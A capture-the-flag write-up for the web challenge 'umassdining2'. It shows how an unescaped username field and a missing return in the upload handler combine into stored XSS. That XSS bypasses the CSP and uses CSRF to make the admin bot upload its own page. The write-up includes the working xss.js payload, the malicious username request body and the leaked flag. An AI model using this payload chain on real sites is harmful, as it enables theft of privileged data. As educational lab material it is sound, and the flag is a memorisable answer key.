# umassdining2 [477 points]

### Description
```
The much awaited sql to the UMass Dining experience. We're back and better than ever, join our super fan contest for a chance to be crowned "The UMassDining Enjoyer"

umassdining2.zip

Author: Ayman#5138

http://umassdining2.web.ctf.umasscybersec.org:6942/
```

The flag is in `/admin_dashboard/`, we need to signed in as admin and the request has to come from localhost, in order for it to render the template with the flag 

There is a `getSub()` in `admin.js` acting as the admin bot

When we are posting to `/submit` it will call `getSub()` to have the admin bot check our uploaded image in `/admin_dashboard`

```js
router.post('/submit',middleware.authReq,(req,res)=>{
    if(!req.user){return res.status(403).send('Unauthorized action!')}
    let file = req.files.submission;
    if(path.extname(file.name)!=='.png'){
        res.status(400).send("Invalid file type. Expected \".png\"")
    }

    let dir = crypto.createHash('md5').update(req.user).digest('hex');
    if(!fs.existsSync(`uploads/${dir}`)){
        fs.mkdirSync(`uploads/${dir}`);
    }
    fs.writeFileSync(`uploads/${dir}/${file.name}`,file.data);

    getSub(req.user,file.name);
    res.send("Admin is gonna check this out.");
})
```

The admin page template shows the flag, username and the file name of the uploaded file

```html
<div style="text-align: center">
    <h2>
    Welcome Admin.
    </h2> 
    <secret>{{flag}}</secret>
    Here is the submission from {{user | safe}}:

    <img src="uploads/{{upload | safe}}">

</div>
```

Although in `app.js` it enabled autoescape :
```js
nunjucks.configure('views',{
    autoescape: true,
    express: app
});
```
The user and upload disabled autoescape, which make them vulnerable to XSS
https://stackoverflow.com/questions/29866034/stop-nunjucks-from-escaping-html

However `admin.html` is using `header.html`, which has implemented CSP
```html

  <meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self';" />
```

We can bypass that by putting the javascript code into a file and upload it to the server, and register a username with the script tag and loading the javascript file for XSS

We can use `/submit` to upload the file :
```js
router.post('/submit',middleware.authReq,(req,res)=>{
    if(!req.user){return res.status(403).send('Unauthorized action!')}
    let file = req.files.submission;
    if(path.extname(file.name)!=='.png'){
        res.status(400).send("Invalid file type. Expected \".png\"")
    }

    let dir = crypto.createHash('md5').update(req.user).digest('hex');
    if(!fs.existsSync(`uploads/${dir}`)){
        fs.mkdirSync(`uploads/${dir}`);
    }
    fs.writeFileSync(`uploads/${dir}/${file.name}`,file.data);

    getSub(req.user,file.name);
    res.send("Admin is gonna check this out.");
})
```

The directory will be md5 hash of the username, my username is `kaiziron`, so the directory for the uploaded files will be `/uploads/44df1efba5907b73744c75510d2ed15e/`

We can just upload a javascript file to the server with `/submit`, even it shows `Invalid file type`, by looking at the docker instance, we will know that the file still get uploaded to that directory

The file will still be written to `/upload/` because it is not returning in that line :
```js
    if(path.extname(file.name)!=='.png'){
        res.status(400).send("Invalid file type. Expected \".png\"")
    }
```

http://umassdining2.web.ctf.umasscybersec.org:6942/uploads/44df1efba5907b73744c75510d2ed15e/xss.js

xss.js :
```js
formData = new FormData();
file = new File([document.documentElement.innerHTML], "kaiziron_flag.txt", {type: "text/plain"});
formData.append("submission", file);
fetch('/submit', {method: "POST", body: formData});
```

Because of the CSP, we can't make request with the flag to a remote server, so we can do CSRF to `/submit` and submit the admin page content as a file on behalf of admin

Then we can register an username (`<script src="/uploads/44df1efba5907b73744c75510d2ed15e/xss.js"></script>`) that will do XSS to admin page by loading that javascript file 

```
user=<script+src%3d"/uploads/44df1efba5907b73744c75510d2ed15e/xss.js"></script>&pass=kaiziron
```

Then we can login to that user, and upload a file with `.png` as file extension, so admin will check it in `/admin_dashboard` and it will load our username which load the `xss.js` file from the same domain that does a CSRF on admin

It will upload the whole admin page content as a file `kaiziron_flag.txt` to `/submit` on behalf of admin

The uploaded file will be in the directory which is the md5 hash of admin : 
http://umassdining2.web.ctf.umasscybersec.org:6942/uploads/21232f297a57a5a743894a0e4a801fc3/kaiziron_flag.txt

```html
<head>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self';">

  <link rel="stylesheet" href="/static/css/style.css">
  <title>UMass Dining Secret Society | THE SQL</title>
</head>

<body><nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <div class="container-fluid">
    <a class="navbar-brand" href="/">UMass Dining</a>
    <div class="collapse navbar-collapse" id="navbarColor02">
      <ul class="navbar-nav">
        <li class="nav-item">
          <a class="nav-link" href="/">Home</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="/dashboard">Dashboard</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="/register">Register</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="/login">Login</a>
        </li>
      </ul>
    </div>
  </div>
</nav>




  <section class="content">
    
<div style="text-align: center">
    <h2>
    Welcome Admin.
    </h2> 
    <secret>UMASS{F0rg0t_T0_R3TuRn_4nd_l0st_mY_FL4g}</secret>
    Here is the submission from <script src="/uploads/44df1efba5907b73744c75510d2ed15e/xss.js"></script></div></section></body>
```

Then we can see the flag in that page :
```
UMASS{F0rg0t_T0_R3TuRn_4nd_l0st_mY_FL4g}
```